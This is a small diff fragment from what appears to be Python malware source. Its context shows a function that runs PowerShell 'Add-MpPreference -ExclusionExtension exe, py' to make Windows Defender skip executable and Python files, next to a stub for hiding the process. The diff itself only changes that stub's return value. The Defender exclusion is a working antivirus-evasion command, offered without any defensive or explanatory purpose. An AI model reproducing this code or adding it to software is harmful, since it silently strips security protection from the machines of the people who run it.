@@ -80,7 +80,7 @@ def add_av_exclusion():
     subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)
 
 def hide_process():
-    return
+    return "I need to learn more :)"
     kernel32.GetCurrentProcessId.restype = ctypes.c_int
     process_id = kernel32.GetCurrentProcessId()
 
